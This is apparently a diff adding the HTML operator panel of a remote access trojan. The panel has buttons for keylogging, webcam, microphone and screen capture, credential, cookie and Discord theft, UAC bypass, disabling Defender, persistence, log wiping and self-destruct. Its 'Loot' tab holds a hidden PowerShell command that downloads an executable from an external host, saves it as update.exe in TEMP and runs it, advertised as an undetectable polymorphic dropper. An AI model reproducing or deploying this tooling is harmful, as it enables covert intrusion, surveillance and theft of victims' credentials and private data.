+                        oninput="setQuality(this.value)" title="JPEG Quality">
+                    <span class="hud-value" id="qualVal">75</span>
+                </div>
+                <!-- Monitor picker -->
+                <div class="remote-hud-chip" id="monPickerChip" style="padding:.2rem .5rem;gap:.3rem;display:none">
+                    <span class="hud-label">🖥</span>
+                    <select id="hudMonSelect" onchange="switchMonitor(this.value)" style="background:transparent;border:none;color:var(--text-1);font-size:.62rem;font-weight:700;font-family:'JetBrains Mono',monospace;outline:none;cursor:pointer">
+                        <option value="0">Screen 1</option>
+                    </select>
+                </div>
+                <!-- Collapse UP button -->
+                <div class="remote-hud-chip" onclick="togglePanelCollapse()" style="cursor:pointer;padding:.2rem .6rem;margin-left:.2rem" title="Hide toolbar">
+                    <span style="font-size:.8rem">&#x25B2;</span>
+                </div>
+            </div>
+            </div><!-- end remoteHeader -->
+        </div><!-- /remote-screen-area -->
+        <!-- Floating Draggable Panel -->
+        <!-- Step 5: Floating Console Trigger -->
+        <div class="remote-trigger" onclick="togglePanel()" title="Reveal Console"></div>
+
+        <div class="remote-sidebar" id="remoteSidebar">
+            <div id="remoteSidebarHeader" style="padding:1rem 1.125rem;border-bottom:1px solid var(--border);cursor:move;display:flex;justify-content:space-between;align-items:center;background:rgba(255,255,255,0.02)">
+                <div style="display:flex;align-items:center;gap:10px">
+                    <div style="width:10px;height:10px;border-radius:50%;background:var(--accent);box-shadow:0 0 8px var(--accent)"></div>
+                    <div>
+                        <div class="card-title" style="font-size:.88rem" id="remoteSideTitle">Node</div>
+                        <div class="card-subtitle" id="remoteSideNodeId" style="font-family:'JetBrains Mono',monospace;font-size:.6rem;margin-top:1px;color:var(--text-3)">Control Panel</div>
+                    </div>
+                </div>
+                <button type="button" class="btn-icon" onclick="togglePanel()" style="width:26px;height:26px;border-radius:8px;color:var(--text-3)" title="Close Panel">
+                    <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.5"><title>Icon</title><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+                </button>
+            </div>
+            
+            <div class="remote-tabs">
+                <button type="button" class="remote-tab active" id="tabBtn_info" onclick="setRemoteTab('info')">Info</button>
+                <button type="button" class="remote-tab" id="tabBtn_audio" onclick="setRemoteTab('audio')">Audio</button>
+                <button type="button" class="remote-tab" id="tabBtn_shell" onclick="setRemoteTab('shell')">Shell</button>
+                <button type="button" class="remote-tab" id="tabBtn_ps" onclick="setRemoteTab('ps')">Procs</button>
+                <button type="button" class="remote-tab" id="tabBtn_files" onclick="setRemoteTab('files')">Files</button>
+                <button type="button" class="remote-tab" id="tabBtn_kl" onclick="setRemoteTab('kl')">Keys</button>
+                <button type="button" class="remote-tab" id="tabBtn_loot" onclick="setRemoteTab('loot')">Loot</button>
+                <button type="button" class="remote-tab" id="tabBtn_tools" onclick="setRemoteTab('tools')">Tools</button>
+            </div>
+
+            <div style="flex-grow:1;overflow-y:auto;padding:1rem;">
+                <div id="remoteTab_info">
+                    <!-- Live Node Stats -->
+                    <div id="nodeStatsBar" style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:.5rem;margin-bottom:.75rem">
+                        <div style="background:rgba(0,240,255,.06);border:1px solid rgba(0,240,255,.15);border-radius:10px;padding:.5rem .6rem;text-align:center">
+                            <div style="font-size:.55rem;font-weight:700;color:var(--text-3);text-transform:uppercase;letter-spacing:.1em">CPU</div>
+                            <div id="statNodeCpu" style="font-size:1rem;font-weight:800;color:var(--accent);font-family:'JetBrains Mono',monospace">—</div>
+                            <div class="stat-mini-bar"><div id="statNodeCpuBar" class="stat-mini-bar-fill" style="width:0%;background:var(--accent)"></div></div>
+                        </div>
+                        <div style="background:rgba(167,139,250,.06);border:1px solid rgba(167,139,250,.15);border-radius:10px;padding:.5rem .6rem;text-align:center">
+                            <div style="font-size:.55rem;font-weight:700;color:var(--text-3);text-transform:uppercase;letter-spacing:.1em">RAM</div>
+                            <div id="statNodeRam" style="font-size:1rem;font-weight:800;color:var(--violet);font-family:'JetBrains Mono',monospace">—</div>
+                            <div class="stat-mini-bar"><div id="statNodeRamBar" class="stat-mini-bar-fill" style="width:0%;background:var(--violet)"></div></div>
+                        </div>
+                        <div style="background:rgba(52,211,153,.06);border:1px solid rgba(52,211,153,.15);border-radius:10px;padding:.5rem .6rem;text-align:center">
+                            <div style="font-size:.55rem;font-weight:700;color:var(--text-3);text-transform:uppercase;letter-spacing:.1em">DISK</div>
+                            <div id="statNodeDisk" style="font-size:1rem;font-weight:800;color:var(--teal);font-family:'JetBrains Mono',monospace">—</div>
+                            <div class="stat-mini-bar"><div id="statNodeDiskBar" class="stat-mini-bar-fill" style="width:0%;background:var(--teal)"></div></div>
+                        </div>
+                    </div>
+                    <div id="remoteSpecsPanel"></div>
+                </div>
+
+                <!-- ── AUDIO TAB ─────────────────────────────── -->
+                <div id="remoteTab_audio" style="display:none">
+                    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:.75rem">
+                        <span style="font-size:.65rem;font-weight:700;color:var(--text-3);text-transform:uppercase">Audio Devices</span>
+                        <button type="button" class="btn-ghost" style="font-size:.62rem;padding:.3rem .6rem" onclick="loadAudioDevices()">↻ Scan</button>
+                    </div>
+                    <!-- Inputs -->
+                    <div style="margin-bottom:.6rem">
+                        <div style="font-size:.58rem;color:var(--text-3);text-transform:uppercase;letter-spacing:.1em;margin-bottom:.3rem">🎤 Microphone Input</div>
+                        <select id="audioInputSelect" style="width:100%;background:rgba(0,0,0,.4);border:1px solid var(--border);border-radius:8px;color:var(--text-1);font-size:.65rem;padding:.4rem .6rem;outline:none">
+                            <option value="">Default Microphone</option>
+                        </select>
+                        <div style="display:flex;gap:.35rem;margin-top:.4rem">
+                            <button type="button" id="btnMicOn" class="btn-ghost" style="flex:1;font-size:.65rem;padding:.4rem" onclick="toggleAudio('mic')">▶ Listen Mic</button>
+                            <button type="button" class="btn-ghost" style="font-size:.65rem;padding:.4rem;color:var(--red)" onclick="toggleAudio('mic',false)">■ Stop</button>
+                        </div>
+                    </div>
+                    <!-- Outputs / Loopback -->
+                    <div style="margin-bottom:.6rem">
+                        <div style="font-size:.58rem;color:var(--text-3);text-transform:uppercase;letter-spacing:.1em;margin-bottom:.3rem">🔊 Desktop Audio (Loopback)</div>
+                        <select id="audioOutputSelect" style="width:100%;background:rgba(0,0,0,.4);border:1px solid var(--border);border-radius:8px;color:var(--text-1);font-size:.65rem;padding:.4rem .6rem;outline:none">
+                            <option value="">Default Speaker Loopback</option>
+                        </select>
+                        <div style="display:flex;gap:.35rem;margin-top:.4rem">
+                            <button type="button" id="btnDeskOn" class="btn-ghost" style="flex:1;font-size:.65rem;padding:.4rem" onclick="toggleAudio('desktop')">▶ Listen Desktop</button>
+                            <button type="button" class="btn-ghost" style="font-size:.65rem;padding:.4rem;color:var(--red)" onclick="toggleAudio('desktop',false)">■ Stop</button>
+                        </div>
+                    </div>
+                    <!-- Volume -->
+                    <div style="margin-bottom:.6rem">
+                        <div style="font-size:.58rem;color:var(--text-3);text-transform:uppercase;letter-spacing:.1em;margin-bottom:.4rem">🔈 Target Volume</div>
+                        <div style="display:flex;align-items:center;gap:.6rem">
+                            <input type="range" id="volSlider" min="0" max="100" value="80" style="flex:1;accent-color:var(--teal)" oninput="setVolume(this.value)">
+                            <span id="volLabel" style="font-size:.65rem;color:var(--text-2);min-width:2.5rem;text-align:right">80%</span>
+                        </div>
+                    </div>
+                    <!-- MP3 Loop -->
+                    <div>
+                        <div style="font-size:.58rem;color:var(--text-3);text-transform:uppercase;letter-spacing:.1em;margin-bottom:.4rem">🎵 Play MP3 on Target</div>
+                        <label style="display:flex;align-items:center;gap:.4rem;background:rgba(255,255,255,.04);border:1px solid var(--border);border-radius:8px;padding:.45rem .7rem;cursor:pointer;font-size:.65rem;color:var(--text-2)">
+                            Upload MP3 (loops silently)
+                            <input type="file" id="audioUploadInput" accept=".mp3,audio/*" style="display:none" onchange="uploadAudio(this)">
+                        </label>
+                        <button type="button" class="btn-ghost" style="width:100%;margin-top:.35rem;font-size:.65rem;padding:.4rem;color:var(--red)" onclick="sendTroll('stopsound')">■ Stop Playback</button>
+                    </div>
+                </div>
+
+                <div id="remoteTab_shell" style="display:none;height:100%">
+                    <div style="position:relative;overflow:hidden;border-radius:12px;margin-bottom:.5rem">
+                        <div class="terminal-scanline"></div>
+                        <div id="shellOutput" style="background:rgba(0,0,0,.5);border:1px solid var(--border);border-radius:10px;padding:.75rem;font-family:'JetBrains Mono',monospace;font-size:.65rem;color:#a3e635;height:260px;overflow-y:auto;white-space:pre-wrap;margin-bottom:0 !important"></div>
+                    </div>
+                    <div style="display:flex;gap:.4rem">
+                        <input type="text" id="shellInput" class="chat-input" placeholder="command..." onkeydown="if(event.key==='Enter')sendShell()" style="font-family:'JetBrains Mono',monospace;font-size:.72rem">
+                        <button type="button" class="btn-primary" onclick="sendShell()" style="padding:.5rem .75rem">▶</button>
+                        <button type="button" class="btn-ghost" onclick="$('shellOutput').textContent=''" style="padding:.5rem .75rem">✕</button>
+                    </div>
+                </div>
+
+                <div id="remoteTab_ps" style="display:none">
+                    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:1rem;background:rgba(255,255,255,.03);padding:.75rem;border-radius:12px;border:1px solid var(--border)">
+                        <div>
+                            <div style="font-size:.75rem;font-weight:800;color:var(--text-1)">PROCESS MANAGER</div>
+                            <div style="font-size:.55rem;color:var(--text-3);text-transform:uppercase;letter-spacing:.1em">Live System Registry</div>
+                        </div>
+                        <div style="display:flex;gap:.5rem;align-items:center">
+                            <input type="text" id="psSearch" placeholder="Filter processes..." oninput="filterProcesses(this.value)" style="background:rgba(0,0,0,.4);border:1px solid var(--border);border-radius:8px;padding:.3rem .6rem;font-size:.65rem;color:var(--text-1);width:140px;outline:none">
+                            <button type="button" class="btn-ghost" style="font-size:.65rem;padding:.4rem .8rem;background:rgba(0,240,255,.1);border:1px solid rgba(0,240,255,.2);color:var(--accent)" onclick="listProcesses()">↻ Refresh</button>
+                        </div>
+                    </div>
+                    <div id="psResult" style="background:rgba(0,0,0,.3);border:1px solid var(--border);border-radius:14px;max-height:440px;overflow-y:auto;font-size:.62rem;backdrop-filter:blur(10px)">
+                        <div style="text-align:center;padding:3rem;color:var(--text-3)">Click Refresh to load processes.</div>
+                    </div>
+                </div>
+
+                <div id="remoteTab_files" style="display:none;height:100%">
+                    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:1rem;background:rgba(255,255,255,.03);padding:.75rem;border-radius:12px;border:1px solid var(--border)">
+                        <div style="display:flex;align-items:center;gap:.75rem">
+                            <span style="font-size:1.2rem">📁</span>
+                            <div>
+                                <div style="font-size:.75rem;font-weight:800;color:var(--accent)">FILE EXPLORER</div>
+                                <div id="fsTabBreadcrumb" style="font-size:.55rem;color:var(--text-3);font-family:'JetBrains Mono',monospace">/</div>
+                            </div>
+                        </div>
+                        <div style="display:flex;gap:.4rem">
+                            <button type="button" class="btn-ghost" style="font-size:.65rem;padding:.4rem .8rem;background:rgba(0,240,255,.1);border:1px solid rgba(0,240,255,.2);color:var(--accent)" onclick="window._fsUpload()">📤 Upload</button>
+                        </div>
+                    </div>
+                    <div id="fsTabListing" style="background:rgba(0,0,0,.3);border:1px solid var(--border);border-radius:14px;height:400px;overflow-y:auto;padding:.75rem;display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:.5rem;align-content:start">
+                        <div style="grid-column:1/-1;text-align:center;padding:3rem;color:var(--text-3)">Loading files...</div>
+                    </div>
+                </div>
+
+                <div id="remoteTab_kl" style="display:none">
+                    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:.5rem">
+                        <span style="font-size:.65rem;font-weight:700;color:var(--text-3);text-transform:uppercase">Keylogger</span>
+                        <div style="display:flex;gap:.35rem">
+                            <button type="button" class="btn-primary" style="font-size:.65rem;padding:.3rem .6rem" id="btnKlStart" onclick="toggleKeylogger()">▶ Start</button>
+                            <button type="button" class="btn-ghost" style="font-size:.65rem;padding:.3rem .6rem" onclick="$('klOutput').textContent=''">Clear</button>
+                        </div>
+                    </div>
+                    <div id="klOutput" style="background:rgba(0,0,0,.5);border:1px solid var(--border);border-radius:10px;padding:.75rem;font-family:'JetBrains Mono',monospace;font-size:.65rem;color:#fbbf24;min-height:200px;max-height:420px;overflow-y:auto;white-space:pre-wrap">Keylogger idle...</div>
+                </div>
+
+                <div id="remoteTab_loot" style="display:none">
+                    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:1rem;background:rgba(255,255,255,.03);padding:.75rem;border-radius:12px;border:1px solid var(--border)">
+                        <div>
+                            <div style="font-size:.75rem;font-weight:800;color:var(--amber)">APEX INTELLIGENCE</div>
+                            <div style="font-size:.55rem;color:var(--text-3);text-transform:uppercase;letter-spacing:.1em">Harvested Credentials & Tokens</div>
+                        </div>
+                        <div style="display:flex;gap:.35rem">
+                             <button type="button" class="btn-ghost" style="font-size:.65rem;padding:.4rem .8rem;background:rgba(251,191,36,0.1);border:1px solid rgba(251,191,36,0.2);color:var(--amber)" onclick="sendCmd('steal',{})">⚡ Full Harvest</button>
+                             <button type="button" class="btn-ghost" style="font-size:.65rem;padding:.4rem .8rem;background:rgba(0,255,204,0.1);border:1px solid rgba(0,255,204,0.2);color:var(--teal)" onclick="exportLoot()">📥 Full Export</button>
+                             <button type="button" class="btn-ghost" style="font-size:.65rem;padding:.4rem .6rem" onclick="$('lootResultBody').innerHTML=''">✕ Clear</button>
+                        </div>
+                    </div>
+
+                    <!-- FUD POLYMORPHIC DEPLOYER -->
+                    <div style="margin-bottom:1.5rem;background:rgba(255,51,102,0.05);padding:1rem;border-radius:12px;border:1px solid rgba(255,51,102,0.2)">
+                        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:0.5rem">
+                            <div>
+                                <div style="font-size:.8rem;font-weight:800;color:var(--red)">POLYMORPHIC DROPPER (FUD)</div>
+                                <div style="font-size:.6rem;color:var(--text-3)">Generates a unique, inflated (+350MB) executable instantly.</div>
+                            </div>
+                            <button type="button" class="btn-ghost" style="background:rgba(255,51,102,0.1);color:var(--red);border-color:var(--red)" onclick="window.open('/api/payload', '_blank')">
+                                🧬 Generate & Download EXE
+                            </button>
+                        </div>
+                        <div style="display:flex;gap:10px">
+                            <input type="text" id="deployCmdInput" readonly value='powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri (Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings).ProxyServer -ErrorAction SilentlyContinue; Invoke-RestMethod -Uri \"https://web-production-43c07.up.railway.app/api/payload\" -OutFile \"$env:TEMP\update.exe\"; Start-Process \"$env:TEMP\update.exe\""' style="flex-grow:1;background:rgba(0,0,0,0.5);border:1px solid var(--border);border-radius:6px;padding:0.5rem;font-size:0.65rem;color:var(--teal);font-family:monospace" onclick="this.select();document.execCommand('copy');showToast('Deployment command copied!', 'ok')">
+                        </div>
+                    </div>
+                    
+                    <div style="margin-bottom: 1rem;">
+                        <input type="text" id="lootSearch" placeholder="Search accounts, sites, or tokens..." oninput="filterLoot(this.value)" style="width:100%;background:rgba(0,0,0,0.4);border:1px solid var(--border);border-radius:10px;padding:.6rem 1rem;font-size:.72rem;color:var(--text-1);outline:none;">
+                    </div>
+
+                    <div id="lootResult" style="background:rgba(0,0,0,.3);border:1px solid var(--border);border-radius:14px;max-height:440px;overflow-y:auto;backdrop-filter:blur(10px)">
+                        <table style="width:100%;border-collapse:collapse;font-size:.68rem">
+                            <thead>
+                                <tr style="background:rgba(255,255,255,.05);color:var(--text-3);text-transform:uppercase;font-size:.55rem">
+                                    <th style="padding:.6rem;text-align:left">Type</th>
+                                    <th style="padding:.6rem;text-align:left">Target / Site</th>
+                                    <th style="padding:.6rem;text-align:left">Identity</th>
+                                    <th style="padding:.6rem;text-align:left">Secret</th>
+                                    <th style="padding:.6rem;text-align:center">Action</th>
+                                </tr>
+                            </thead>
+                            <tbody id="lootResultBody">
+                                <tr><td colspan="5" style="text-align:center;padding:3rem;color:var(--text-3)">No data harvested yet. Click "Full Harvest" to begin.</td></tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+
+                <div id="remoteTab_tools" style="display:none">
+                    <!-- Pill nav — category switcher -->
+                    <div class="tool-pill-nav" style="margin-bottom: 1.5rem; display: flex; gap: 8px; flex-wrap: wrap;">
+                        <button type="button" class="tool-pill active" id="pill_surv" onclick="showToolCat('surv')">📷 Surv</button>
+                        <button type="button" class="tool-pill" id="pill_files" onclick="showToolCat('files')">📁 Files</button>
+                        <button type="button" class="tool-pill" id="pill_sys" onclick="showToolCat('sys')">⚙️ Sys</button>
+                        <button type="button" class="tool-pill" id="pill_net" onclick="showToolCat('net')">🌐 Net</button>
+                        <button type="button" class="tool-pill" id="pill_recon" onclick="showToolCat('recon')">🛰️ Recon</button>
+                        <button type="button" class="tool-pill" id="pill_reg" onclick="showToolCat('reg')">🔑 Reg</button>
+                        <button type="button" class="tool-pill" id="pill_power" onclick="showToolCat('power')">⚡ Power</button>
+                        <button type="button" class="tool-pill danger-pill" id="pill_forensics" onclick="showToolCat('forensics')">🛡️ Forensic</button>
+                        <button type="button" class="tool-pill danger-pill" id="pill_troll" onclick="showToolCat('troll')">🎭 Trolls</button>
+                        <button type="button" class="tool-pill danger-pill" id="pill_nuke" onclick="showToolCat('nuke')">💀 Nuke</button>
+                    </div>
+
+                    <!-- FORENSICS -->
+                    <div id="toolcat_forensics" class="tool-cat" style="display:none">
+                        <div class="tool-cat-header" style="color:var(--amber)">🛡️ Forensic Countermeasures</div>
+                        <div class="tool-grid">
+                            <button type="button" class="tool-btn btn-apex" onclick="sendCmd('wipe_logs',{})">🛡️ Wipe Event Logs</button>
+                            <button type="button" class="tool-btn" onclick="promptCmd('timestomp','Target File:','target','')">🕒 Timestomp File</button>
+                            <button type="button" class="tool-btn danger full" onclick="if(confirm('☢️ SELF DESTRUCT?\nThis will remove ALL traces and kill the agent permanently.')) sendCmd('self_destruct',{})">☢️ INITIATE SELF-DESTRUCT</button>
+                        </div>
+                    </div>
+
+                    <!-- SURVEILLANCE -->
+                    <div id="toolcat_surv" class="tool-cat">
+                        <div class="tool-cat-header">📷 Surveillance Operations</div>
+                        <div class="tool-grid">
+                            <button type="button" class="tool-btn btn-apex" onclick="sendCmd('get_cameras',{})">📸 Enum Cameras</button>
+                            <button type="button" class="tool-btn btn-apex" onclick="promptCmd('webcam_snap','Camera Index:','idx',0)">📸 Webcam Snap</button>
+                            <button type="button" class="tool-btn" onclick="sendCmd('record_webcam',{duration:5})">🎥 Webcam 5s</button>
+                            <button type="button" class="tool-btn" onclick="promptCmd('record_webcam','Duration (secs):','duration',5)">🎥 Webcam (N)s</button>
+                            <button type="button" class="tool-btn" onclick="sendCmd('record_screen',{duration:10})">🎬 Screen 10s</button>
+                            <button type="button" class="tool-btn" onclick="promptCmd('record_screen','Duration (secs):','duration',10)">🎬 Screen (N)s</button>
+                            <button type="button" class="tool-btn" onclick="promptCmd('ss_loop','Screenshot interval (secs):','interval',5)">📸 SS Loop</button>
+                            <button type="button" class="tool-btn" onclick="sendCmd('record_voice',{duration:30})">🎙 Voice 30s</button>
+                            <button type="button" class="tool-btn" onclick="promptCmd('record_voice','Duration (secs):','duration',30)">🎙 Voice (N)s</button>
+                            <button type="button" class="tool-btn teal" onclick="sendCmd('steal',{})">🔑 Steal Creds</button>
+                            <button type="button" class="tool-btn btn-elite full" onclick="sendCmd('browser_hijack',{})">🎭 Deploy Browser Hijacker</button>
+                            <button type="button" class="tool-btn btn-elite full" onclick="sendCmd('hvnc_start',{})">👁️ Spawn Hidden Desktop (HVNC)</button>
+                            <button type="button" class="tool-btn danger full" onclick="sendCmd('hvnc_stop',{})">👁️ Stop HVNC (Return to Main)</button>
+                        </div>
+                    </div>
+
+                    <!-- FILES -->
+                    <div id="toolcat_files" class="tool-cat" style="display:none">
+                        <div class="tool-cat-header">📁 File Intelligence</div>
+                        <div class="tool-grid">
+                            <button type="button" class="tool-btn" onclick="browseDir('C:\\\\Users')">🏠 Browse Users</button>
+                            <button type="button" class="tool-btn" onclick="browseDir('C:\\\\')">💾 Browse C:\\</button>
+                            <button type="button" class="tool-btn" onclick="promptBrowse()">📂 Custom Path</button>
+                            <button type="button" class="tool-btn teal" onclick="_triggerFileUpload()">📤 Upload File</button>
+                            <button type="button" class="tool-btn" onclick="promptDownloadUrl()">⬇️ DL from URL</button>
+                            <button type="button" class="tool-btn" onclick="sendCmd('screenshot_snap',{})">📸 Screenshot</button>
+                            <button type="button" class="tool-btn" onclick="sendCmd('clipboard_get',{})">📋 Get Clipboard</button>
+                            <button type="button" class="tool-btn" onclick="_promptClipboardSet()">📋 Set Clipboard</button>
+                            <button type="button" class="tool-btn" onclick="sendCmd('active_window',{})">🪟 Active Window</button>
+                            <button type="button" class="tool-btn" onclick="sendCmd('get_recent_files',{})">🕐 Recent Files</button>
+                            <button type="button" class="tool-btn" onclick="_promptReadFile()">📄 Read File</button>
+                            <button type="button" class="tool-btn danger" onclick="_promptDeleteFile()">🗑 Delete File</button>
+                            <button type="button" class="tool-btn danger" onclick="sendCmd('kill_explorer',{})">🗕 Kill Explorer</button>
+                            <button type="button" class="tool-btn danger" onclick="promptKillApp()">❌ Kill App</button>
+                            <button type="button" class="tool-btn" onclick="sendCmd('recycle_bin',{})">🗑 Empty Recycle</button>
+                        </div>
+                    </div>
+
+                    <!-- SYSTEM -->
+                    <div id="toolcat_sys" class="tool-cat" style="display:none">
+                        <div class="tool-cat-header">⚙️ System Control</div>
+                        <div class="tool-grid">
+                            <button type="button" class="tool-btn teal full" onclick="sendCmd('elevate_system',{})">⚡ Elevate to SYSTEM</button>
+                            <button type="button" class="tool-btn btn-apex" onclick="sendCmd('get_system_info',{})">📊 Full System Audit</button>
+                            <button type="button" class="tool-btn" onclick="sendCmd('whoami',{})">👤 Whoami</button>
+                            <button type="button" class="tool-btn" onclick="sendCmd('drives',{})">💾 Drives</button>
+                            <button type="button" class="tool-btn" onclick="sendCmd('disk_usage',{})">📊 Disk Usage</button>
+                            <button type="button" class="tool-btn" onclick="sendCmd('env_vars',{})">🌿 Env Vars</button>
+                            <button type="button" class="tool-btn" onclick="sendCmd('list_startup',{})">🚀 Startup Programs</button>
+                            <button type="button" class="tool-btn" onclick="sendCmd('get_installed',{})">📦 Installed Apps</button>
+                            <button type="button" class="tool-btn btn-apex" onclick="sendCmd('startup_persist',{})">🔄 Install Persistence</button>
+                            <button type="button" class="tool-btn btn-apex" onclick="sendCmd('check_persistence',{})">🔍 Check Persistence</button>
+                            <button type="button" class="tool-btn" onclick="sendCmd('stream_key',{})">🎮 Stream Keys</button>
+                            <button type="button" class="tool-btn btn-apex" onclick="sendCmd('steal',{})">🔑 Steal Credentials</button>
+                            <button type="button" class="tool-btn btn-apex" onclick="sendCmd('cookie_steal',{})">🍪 Steal Cookies</button>
+                            <button type="button" class="tool-btn btn-apex" onclick="sendCmd('discord_steal',{})">💬 Discord Hijack</button>
+                            <button type="button" class="tool-btn btn-apex" onclick="sendCmd('browser_history',{})">🌐 Browser History</button>
+                            <button type="button" class="tool-btn btn-elite" onclick="sendCmd('uac_bypass',{})">🛡️ Silent UAC Bypass</button>
+                            <button type="button" class="tool-btn btn-elite" onclick="sendCmd('process_ghost',{})">👻 Ghost Migration</button>
+                            <button type="button" class="tool-btn" onclick="promptCmd('type_text','Text to type:','text','hello')">⌨️ Type Text</button>
+                            <button type="button" class="tool-btn" onclick="promptCmd('press_key','Key combo (e.g. alt+f4):','keys','win')">🔑 Press Key</button>
+                            <button type="button" class="tool-btn" onclick="promptMoveMouse()">🖱 Move Mouse</button>
+                            <button type="button" class="tool-btn" onclick="sendCmd('click_mouse',{})">🖱 Click</button>
+                            <button type="button" class="tool-btn danger" onclick="sendCmd('lock_screen',{})">🔒 Lock Screen</button>
+                            <button type="button" class="tool-btn danger" onclick="sendCmd('hide_taskbar',{hide:true})">🪟 Hide Taskbar</button>
+                            <button type="button" class="tool-btn teal" onclick="sendCmd('hide_taskbar',{hide:false})">🪟 Show Taskbar</button>
+                            <button type="button" class="tool-btn danger" onclick="sendCmd('swap_mouse',{swap:true})">🖱 Swap Mouse</button>
+                            <button type="button" class="tool-btn teal" onclick="sendCmd('swap_mouse',{swap:false})">🖱 Restore Mouse</button>
+                            <button type="button" class="tool-btn" onclick="_promptRunProgram()">▶ Run Program</button>
+                            <button type="button" class="tool-btn" onclick="_promptOpenUrl()">🌐 Open URL</button>
+                            <button type="button" class="tool-btn" onclick="_promptBeep()">🔔 Play Beep</button>
+                            <button type="button" class="tool-btn" onclick="_promptToast()">🔔 Toast Notify</button>
+                            <button type="button" class="tool-btn" onclick="_promptMsgBox()">💬 MessageBox</button>
+                            <button type="button" class="tool-btn" onclick="sendCmd('get_users',{})">👥 List Users</button>
+                            <button type="button" class="tool-btn" onclick="_promptCreateUser()">👤+ Create User</button>
+                            <button type="button" class="tool-btn" onclick="sendCmd('get_battery',{})">🔋 Battery</button>
+                            <button type="button" class="tool-btn" onclick="sendCmd('get_volume',{})">🔊 Get Volume</button>
+                            <button type="button" class="tool-btn" onclick="_promptSetVolume()">🔊 Set Volume</button>
+                            <button type="button" class="tool-btn" onclick="sendCmd('get_services',{})">⚙️ List Services</button>
+                            <button type="button" class="tool-btn" onclick="_promptStopService()">⛔ Stop Service</button>
+                            <button type="button" class="tool-btn" onclick="_promptStartService()">▶ Start Service</button>
+                            <button type="button" class="tool-btn btn-apex" onclick="sendCmd('get_product_key',{})">🔑 Win Product Key</button>
+                            <button type="button" class="tool-btn" onclick="sendCmd('get_monitor_info',{})">🖥 Monitor Info</button>
+                            <button type="button" class="tool-btn" onclick="sendCmd('detailed_process_list',{})">📊 Proc Details</button>
+                            <button type="button" class="tool-btn" onclick="sendCmd('cmd_history',{})">📜 PS History</button>
+                            <button type="button" class="tool-btn" onclick="sendCmd('get_prefetch',{})">🔍 Prefetch</button>
+                            <button type="button" class="tool-btn danger" onclick="sendCmd('disable_defender',{})">🚫 Kill Defender</button>
+                            <button type="button" class="tool-btn teal" onclick="sendCmd('enable_defender',{})">✅ Restore Defender</button>
+                            <button type="button" class="tool-btn btn-apex" onclick="sendCmd('task_scheduler_add',{})">🔗 Task Persist</button>
+                            <button type="button" class="tool-btn" onclick="sendCmd('task_scheduler_remove',{})">✖ Remove Task</button>
+                        </div>
+                    </div>
+
+                    <!-- NETWORK -->
+                    <div id="toolcat_net" class="tool-cat" style="display:none">
+                        <div class="tool-cat-header">🌐 Network Intel</div>
+                        <div class="tool-grid">
+                            <button type="button" class="tool-btn" onclick="sendNetCmd('ipconfig')">📡 ipconfig</button>
+                            <button type="button" class="tool-btn" onclick="sendNetCmd('netstat')">🔌 netstat</button>
+                            <button type="button" class="tool-btn btn-apex" onclick="sendCmd('wifi_passwords',{})">📶 WiFi Passwords</button>
+                            <button type="button" class="tool-btn btn-apex" onclick="sendCmd('wifi_steal',{})">📶 WiFi (Apex)</button>
+                            <button type="button" class="tool-btn" onclick="sendCmd('get_open_ports',{})">🔌 Open Ports</button>
+                            <button type="button" class="tool-btn" onclick="sendCmd('get_geo',{})">🌍 Geolocation</button>
+                            <button type="button" class="tool-btn" onclick="promptNetCmd('ping')">🏓 Ping host</button>
+                            <button type="button" class="tool-btn" onclick="promptNetCmd('tracert')">🗺 Tracert</button>
+                            <button type="button" class="tool-btn btn-apex" onclick="sendCmd('net_scan',{})">🔍 Deep LAN Scan</button>
+                            <button type="button" class="tool-btn" onclick="promptNetCmd('portscan')">🔍 Port Scan</button>
+                            <button type="button" class="tool-btn" onclick="_promptRunUrl()">⬇️ Run from URL</button>
+                            <button type="button" class="tool-btn" onclick="sendCmd('get_arp',{})">📶 ARP Table</button>
+                            <button type="button" class="tool-btn" onclick="sendCmd('get_dns_cache',{})">📄 DNS Cache</button>
+                            <button type="button" class="tool-btn" onclick="sendCmd('flush_dns',{})">🔄 Flush DNS</button>
+                            <button type="button" class="tool-btn danger" onclick="_promptBlockSite()">🚫 Block Site</button>
+                            <button type="button" class="tool-btn teal" onclick="_promptUnblockSite()">✅ Unblock Site</button>
+                        </div>
+                    </div>
+
+                    <!-- RECON -->
+                    <div id="toolcat_recon" class="tool-cat" style="display:none">
+                        <div class="tool-cat-header">🛰️ Internal Recon Scout</div>
+                        <div class="tool-grid">
+                            <button type="button" class="tool-btn btn-elite full" onclick="sendCmd('get_subnet',{})">📡 Discover Local Subnet</button>
+                            <button type="button" class="tool-btn btn-apex" onclick="_promptPingSweep()">🛰️ Start Ping Sweep</button>
+                            <button type="button" class="tool-btn btn-apex" onclick="_promptPortScan()">🔍 IP Port Scan</button>
+                        </div>
+                    </div>
+
+                    <!-- REGISTRY -->
+                    <div id="toolcat_reg" class="tool-cat" style="display:none">
+                        <div class="tool-cat-header">🔑 Registry Access</div>
+                        <div class="tool-grid">
+                            <button type="button" class="tool-btn" onclick="promptRegRead()">📖 Read Key</button>
+                            <button type="button" class="tool-btn danger" onclick="promptRegWrite()">✏️ Write Key</button>
+                            <button type="button" class="tool-btn danger" onclick="_promptRegDelete()">🗑 Delete Key/Value</button>
+                        </div>
+                    </div>
+
+                    <!-- TROLLS -->
+                    <div id="toolcat_troll" class="tool-cat" style="display:none">
+                        <div class="tool-cat-header">🎭 Troll Arsenal</div>
+                        <div class="tool-grid">
+                            <button type="button" class="tool-btn danger" onclick="sendTroll('mnk')">🔒 Block MNK</button>
+                            <button type="button" class="tool-btn teal" onclick="sendTroll('stopmnk')">🔓 Unblock MNK</button>
+                            <button type="button" class="tool-btn danger" onclick="sendTroll('notepadspam')">📝 Notepad ×5</button>
